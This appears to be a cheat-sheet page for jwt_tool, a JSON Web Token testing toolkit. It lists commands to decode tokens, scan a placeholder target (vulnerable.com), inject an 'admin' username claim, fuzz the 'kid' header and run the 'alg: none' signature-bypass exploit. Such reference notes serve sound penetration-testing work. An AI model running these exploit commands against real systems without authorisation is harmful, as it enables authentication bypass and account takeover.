---
title: Jwt_tool
desc: A toolkit for testing, tweaking and cracking JSON Web Tokens (JWT).
tags: [JWT, Web]
alts: []
website: https://github.com/ticarpi/jwt_tool
render_with_liquid: false
---

## Recon

```sh
python jwt_tool.py <Base64_Encoded_JWT>
```

<br />

## Automation

```sh
# Scan
# -t: Target URL
# -rc: Cookies
# -M pb: Playbook Scan Mode
# -cv: Canary Value
python jwt_tool.py -t https://vulnerable.com/admin -rc "jwt=<Base64_Encoded_JWT>;anothercookie=test" -M pb -cv "not authorized"

# Exploit
# -X i: Exploit (inject inline)
# -I -pc username -pv admin: Inject Claim ("username": admin)
python jwt_tool.py -t https://vulnerable.com/admin -rc "jwt=<Base64_Encoded_JWT>;anothercookie=test" -X i -I -pc username -pv admin

# Fuzzing
# -I -hc kid -hv wordlist.txt: Inject Claim ("kid": FUZZ)
python jwt_tool.py -t https://vulnerable.com/admin -rc "jwt=<Base64_Encoded_JWT>;anothercookie=test" -I -hc kid -hv wordlist.txt
```

<br />

## Manual

```sh
# Tamper (Manual Exploit)
python jwt_tool.py <Base64_Encoded_JWT> -T

# Exploit (Automated Exploit)
# -X a: Exploit (alg: none)
python jwt_tool.py <Base64_Encoded_JWT> -X a
```